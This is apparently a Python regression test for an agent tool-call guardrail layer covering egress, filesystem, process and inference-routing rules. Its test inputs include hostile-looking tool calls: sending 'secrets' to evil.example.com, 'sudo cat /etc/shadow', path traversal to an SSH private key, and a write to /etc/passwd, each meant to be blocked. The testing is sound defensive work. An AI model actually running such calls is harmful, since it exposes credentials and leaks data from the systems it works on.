#!/usr/bin/env python3
"""Regression: the NemoClaw Guardrails policy layer (backend/services/nemoclaw_guard.py)
and its composition in /api/toolguard (backend/routers/toolguard.py).

Guards:
  - the OpenShell-shaped policy evaluation: deny-by-default egress with
    host/port/path rules, filesystem read/write scopes, denied binaries, the
    local-only inference (privacy router) rule, a missing policy = fail-closed;
  - the optional NeMo rail over sensitive calls (stubbed);
  - compose_decision: NemoClaw blocks are enforced by the NemoClaw toggle alone,
    legacy blocks by TOOL_GUARD_ENABLED alone, with guardrail_ids attribution;
  - OCSF denial mapping for the runtime feed and the after_tool_call attribution;
  - the persisted toggle (settings_store) round-trip.

Offline; the policy file under guardrails/nemoclaw is the one shipped. Run:
    venv/bin/python tests/test_nemoclaw_guard.py    # exit 0 = pass
"""
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from backend.config import settings  # noqa: E402
from backend.routers import toolguard  # noqa: E402
from backend.services import nemoclaw_guard as ncg  # noqa: E402

_fails = 0


def check(name: str, cond: bool, detail: str = "") -> None:
    global _fails
    print(f"  {'PASS' if cond else 'FAIL'}  {name}" + (f"  [{detail}]" if detail and not cond else ""))
    if not cond:
        _fails += 1


def _ev(tool, args, **kw):
    kw.setdefault("use_nemo_rails", False)
    return ncg.evaluate(tool, args, f"{tool}({args})", **kw)


def test_policy_loads() -> None:
    s = ncg.policy_summary()
    check("shipped policy loads", s.get("loaded") is True, str(s))
    check("policy has the demobot-guard + local-inference network policies",
          {"demobot-guard", "local-inference"} <= set(s.get("network_policies") or []))
    check("inference is local-only", s.get("inference_local_only") is True)


def test_network_rules() -> None:
    v = _ev("web_fetch", {"url": "http://127.0.0.1:8001/api/toolguard/decoy-sink"})
    check("egress to the DemoBot guard endpoint is allowed", v.should_block is False, str(v.reasons))
    v = _ev("web_fetch", {"url": "https://evil.example.com/collect", "body": "secrets"})
    check("egress to an unlisted host is denied", v.should_block is True)
    check("... attributed as NemoClaw: network egress", "NemoClaw: network egress" in v.rule_names, str(v.rule_names))
    check("... reason names the destination", any("evil.example.com:443/collect" in r for r in v.reasons), str(v.reasons))
    v = _ev("web_fetch", {"url": "http://127.0.0.1:8001/admin/logs/metrics"})
    check("allowed host but unlisted path is denied (path rules)", v.should_block is True)
    v = _ev("web_fetch", {"url": "http://127.0.0.1:9999/api/toolguard/inspect"})
    check("allowed host but wrong port is denied", v.should_block is True)


def test_inference_privacy_router() -> None:
    v = _ev("web_fetch", {"url": "https://api.openai.com/v1/chat/completions", "method": "POST"})
    check("model call to a cloud endpoint -> NemoClaw: inference", "NemoClaw: inference" in v.rule_names, str(v.rule_names))
    check("... not double-counted as plain egress", "NemoClaw: network egress" not in v.rule_names)
    v = _ev("web_fetch", {"url": "http://localhost:8000/v1/chat/completions"})
    check("model call to the local NIM is allowed", v.should_block is False, str(v.reasons))


def test_filesystem_rules() -> None:
    v = _ev("read", {"path": "/home/node/.openclaw/workspace/inbox/note.md"})
    check("read inside the workspace allowed", v.should_block is False, str(v.reasons))
    v = _ev("read", {"path": "/etc/hostname"})
    check("read of a read-only system scope allowed", v.should_block is False, str(v.reasons))
    v = _ev("write", {"path": "/etc/passwd", "content": "x"})
    check("write to a read-only scope denied", v.should_block is True and "NemoClaw: filesystem" in v.rule_names)
    v = _ev("read", {"path": "/home/node/.openclaw/workspace/../../.ssh/id_rsa"})
    check("traversal out of every scope denied", v.should_block is True)
    v = _ev("write", {"path": "/tmp/scratch.txt", "content": "x"})
    check("write to /tmp (read_write) allowed", v.should_block is False, str(v.reasons))
    v = _ev("exec", {"command": "echo hi > /sandbox/.openclaw/workspace/out.txt"})
    check("shell redirection into the sandbox workspace allowed", v.should_block is False, str(v.reasons))
    v = _ev("exec", {"command": "cat /proc/version > /usr/local/owned"})
    check("shell write outside read_write denied", v.should_block is True)


def test_process_rules() -> None:
    v = _ev("exec", {"command": "sudo cat /etc/shadow"})
    check("denied binary (sudo) -> NemoClaw: process", "NemoClaw: process" in v.rule_names, str(v.rule_names))
    v = _ev("exec", {"command": "ls -la /tmp"})
    check("ordinary command allowed", v.should_block is False, str(v.reasons))
    v = _ev("read", {"path": "/tmp/nc-notes.txt"})
    check("a denied-binary NAME inside a path is not a process violation", "NemoClaw: process" not in v.rule_names)


def test_missing_policy_fails_closed() -> None:
    orig = settings.nemoclaw_policy_path
    try:
        settings.nemoclaw_policy_path = "guardrails/nemoclaw/does-not-exist.yaml"
        ncg._policy = None
        v = _ev("read", {"path": "/tmp/x"})
        check("missing policy -> blocked with the NemoClaw: policy rule",
              v.should_block is True and "NemoClaw: policy" in v.rule_names)
        check("policy_summary reports the load error", ncg.policy_summary().get("loaded") is False)
    finally:
        settings.nemoclaw_policy_path = orig
        ncg._policy = None
        ncg.load_policy(force=True)


def test_nemo_rail_over_sensitive_calls() -> None:
    from backend.services import nemo_guardrails as ng

    class _Stub:
        is_configured = True
        calls = []

        def check_tool_call(self, rendered):
            self.calls.append(rendered)
            return ng.RailVerdict(is_safe=False, stage="tool", rule_names=["self check input"])

    orig = ng.nemo_guardrails_client
    try:
        ng.nemo_guardrails_client = _Stub()
        v = ncg.evaluate("exec", {"command": "ls"}, "exec(ls)", sensitive=True, use_nemo_rails=True)
        check("sensitive call -> NeMo rail consulted and its block attributed",
              v.should_block is True and any(r.startswith("NemoClaw: NeMo rail") for r in v.rule_names), str(v.rule_names))
        _Stub.calls.clear()
        v = ncg.evaluate("read", {"path": "/tmp/a"}, "read", sensitive=False, use_nemo_rails=True)
        check("benign call -> NeMo rail NOT consulted (no LLM cost on reads)", _Stub.calls == [] and v.should_block is False)
    finally:
        ng.nemo_guardrails_client = orig


def test_compose_decision() -> None:
    c = toolguard.compose_decision
    r = c(legacy_block=True, nemoclaw_block=False, tool_guard_enabled=False, nemoclaw_enabled=False)
    check("legacy block, guard off -> observed, not enforced", r["decision"] == "block" and r["block"] is False
          and r["guardrail_ids"] == ["openclaw_tool_guard"])
    r = c(legacy_block=True, nemoclaw_block=False, tool_guard_enabled=True, nemoclaw_enabled=True)
    check("legacy block, guard on -> enforced by tool_guard", r["block"] is True and r["enforced_by"] == ["tool_guard"])
    r = c(legacy_block=False, nemoclaw_block=True, tool_guard_enabled=False, nemoclaw_enabled=True)
    check("NemoClaw block, toggle on -> enforced by nemoclaw even with the tool guard off",
          r["block"] is True and r["enforced_by"] == ["nemoclaw"] and r["guardrail_ids"] == ["nemoclaw_guardrails"])
    r = c(legacy_block=False, nemoclaw_block=True, tool_guard_enabled=True, nemoclaw_enabled=False)
    check("NemoClaw block, toggle off -> not enforced (the toggle is the switch)", r["block"] is False)
    r = c(legacy_block=True, nemoclaw_block=True, tool_guard_enabled=True, nemoclaw_enabled=True)
    check("both -> both layers attributed", r["enforced_by"] == ["tool_guard", "nemoclaw"]
          and r["guardrail_ids"] == ["openclaw_tool_guard", "nemoclaw_guardrails"])
    r = c(legacy_block=False, nemoclaw_block=False, tool_guard_enabled=True, nemoclaw_enabled=True)
    check("no block -> allow with no guardrail_ids", r["decision"] == "allow" and r["guardrail_ids"] is None)


def test_ocsf_mapping_and_observe() -> None:
    rec = {"class_uid": 4001, "action": "Denied", "disposition": "Blocked", "status_detail": "no matching policy",
           "dst_endpoint": {"domain": "evil.example.com", "port": 443},
           "actor": {"process": {"name": "/usr/bin/curl", "pid": 64}},
           "firewall_rule": {"name": "baseline", "type": "egress"}}
    d = toolguard.ocsf_denial(rec)
    check("OCSF denied network record maps to a NemoClaw denial",
          d is not None and d["tool_name"] == "curl" and d["rule_name"] == "NemoClaw: network egress (baseline)"
          and "evil.example.com:443" in d["reason"], str(d))
    check("allowed OCSF record is ignored", toolguard.ocsf_denial({"class_uid": 4001, "action": "Allowed"}) is None)
    check("process denial maps to the process layer",
          toolguard.ocsf_denial({"class_uid": 1007, "action": "Denied", "actor": {"process": {"name": "sudo"}}})["rule_name"].startswith("NemoClaw: process"))
    check("after_tool_call: policy_denied error is attributed", toolguard.is_policy_denied('{"error":"policy_denied","detail":"POST /x not permitted by policy"}'))
    check("after_tool_call: ordinary error is not", toolguard.is_policy_denied("ECONNRESET") is False)


def test_toggle_store_roundtrip() -> None:
    from backend import settings_store

    mem = {}
    orig_load, orig_persist = settings_store.load, settings_store._persist
    orig = settings.nemoclaw_guardrails_enabled
    try:
        settings_store.load = lambda: dict(mem)
        settings_store._persist = lambda data: (mem.clear(), mem.update(data))
        settings_store.set_nemoclaw_guardrails(True)
        check("toggle ON persists + applies live", mem["nemoclaw_guardrails"]["enabled"] is True
              and settings.nemoclaw_guardrails_enabled is True and ncg.is_enabled())
        settings.nemoclaw_guardrails_enabled = False
        settings_store.apply_nemoclaw_guardrails_from_store()
        check("startup re-applies the persisted toggle", settings.nemoclaw_guardrails_enabled is True)
        settings_store.set_nemoclaw_guardrails(False)
        check("toggle OFF persists", mem["nemoclaw_guardrails"]["enabled"] is False and not ncg.is_enabled())
    finally:
        settings_store.load, settings_store._persist = orig_load, orig_persist
        settings.nemoclaw_guardrails_enabled = orig


def main() -> int:
    for fn in (
        test_policy_loads, test_network_rules, test_inference_privacy_router, test_filesystem_rules,
        test_process_rules, test_missing_policy_fails_closed, test_nemo_rail_over_sensitive_calls,
        test_compose_decision, test_ocsf_mapping_and_observe, test_toggle_store_roundtrip,
    ):
        try:
            fn()
        except Exception as e:  # noqa: BLE001
            global _fails
            _fails += 1
            print(f"  ERROR {fn.__name__}: {type(e).__name__}: {e}")
    print(f"RESULT: {'ok' if not _fails else str(_fails) + ' failed'}")
    return 1 if _fails else 0


if __name__ == "__main__":
    sys.exit(main())
